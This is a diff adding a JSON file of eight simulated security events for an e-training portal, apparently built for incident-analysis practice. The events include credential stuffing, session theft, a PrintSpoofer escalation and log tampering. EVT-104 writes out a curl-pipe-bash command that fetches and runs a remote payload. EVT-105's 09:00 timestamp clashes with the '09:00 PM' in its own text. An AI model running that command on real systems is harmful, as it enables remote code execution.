@@ -1,0 +1,76 @@
+{
+  "events": [
+    {
+      "event_id": "EVT-101",
+      "timestamp": "2026-05-06T07:22:10",
+      "source_host": "192.168.1.10",
+      "event_type": "Authentication Failure",
+      "severity": "high",
+      "user": "trainee_portal",
+      "description": "Credential stuffing attack detected on e-training portal login page. 1,847 login attempts using known breached credential pairs from public data breach databases. Source IPs span 14 countries — attack is being coordinated through a botnet. 12 accounts successfully authenticated before rate limiting was applied."
+    },
+    {
+      "event_id": "EVT-102",
+      "timestamp": "2026-05-06T07:35:48",
+      "source_host": "192.168.1.10",
+      "event_type": "Unauthorized Access",
+      "severity": "critical",
+      "user": "mnakamura",
+      "description": "Account mnakamura accessed from two simultaneous geographic locations: local office (192.168.1.x) and IP 103.21.58.9 (Philippines — external). Session token appears to have been stolen. The external session is browsing trainee personal records and certification data. Possible account takeover via credential stuffing attack."
+    },
+    {
+      "event_id": "EVT-103",
+      "timestamp": "2026-05-06T08:10:05",
+      "source_host": "192.168.1.25",
+      "event_type": "Unauthorized Access",
+      "severity": "critical",
+      "user": "root",
+      "description": "Remote root login to MySQL database server from unexpected host 192.168.1.10 (web server). The web application should connect using a limited-privilege service account, not root. Direct root database access from the web server indicates the web application credentials or the server itself has been compromised. Query log shows SELECT on all tables in all databases."
+    },
+    {
+      "event_id": "EVT-104",
+      "timestamp": "2026-05-06T08:15:30",
+      "source_host": "192.168.1.25",
+      "event_type": "Suspicious Process",
+      "severity": "high",
+      "user": "mysql",
+      "description": "MySQL process spawned an unexpected child process: bash -c 'curl http://45.33.32.156/payload.sh | bash'. A web shell or SQL injection with file write privileges has allowed the attacker to execute OS commands through the database service. Outbound connection to known malware hosting IP blocked by firewall."
+    },
+    {
+      "event_id": "EVT-105",
+      "timestamp": "2026-05-06T09:00:00",
+      "source_host": "192.168.1.20",
+      "event_type": "Policy Violation",
+      "severity": "medium",
+      "user": "klee",
+      "description": "User klee attempted to access restricted training module MARITIME_CERT_EXAM outside of permitted hours (policy allows 08:00-18:00 only). Access attempted at 09:00 PM. Additionally, user attempted to download the complete exam question bank as a ZIP file — this download was blocked by DLP policy. Third similar violation this week."
+    },
+    {
+      "event_id": "EVT-106",
+      "timestamp": "2026-05-06T10:45:22",
+      "source_host": "192.168.1.5",
+      "event_type": "Privilege Escalation",
+      "severity": "high",
+      "user": "jdoe",
+      "description": "User jdoe ran whoami /priv and net localgroup administrators commands via PowerShell, then executed a known local privilege escalation exploit (PrintSpoofer) targeting the Windows Print Spooler service. Escalation was successful — subsequent commands ran as NT AUTHORITY\\SYSTEM. Host is running unpatched Windows Server 2019."
+    },
+    {
+      "event_id": "EVT-107",
+      "timestamp": "2026-05-06T11:30:17",
+      "source_host": "192.168.1.1",
+      "event_type": "Policy Violation",
+      "severity": "medium",
+      "user": "system",
+      "description": "Firewall detected port scanning activity originating from internal host 192.168.1.20. Sequential TCP SYN packets sent to 192.168.1.1 through 192.168.1.254 across ports 22, 80, 443, 445, 3389. Internal network reconnaissance suggests a compromised internal host is mapping the network for lateral movement targets."
+    },
+    {
+      "event_id": "EVT-108",
+      "timestamp": "2026-05-06T13:05:44",
+      "source_host": "192.168.1.10",
+      "event_type": "Log Tampering",
+      "severity": "critical",
+      "user": "www-data",
+      "description": "Web server access logs for the period 07:00-09:00 have been deleted or overwritten. Log rotation was not scheduled during this window. The deleted logs correspond exactly to the timeframe of the credential stuffing attack and unauthorized database access. Attacker appears to be using web shell access to delete evidence of their activities."
+    }
+  ]
+}
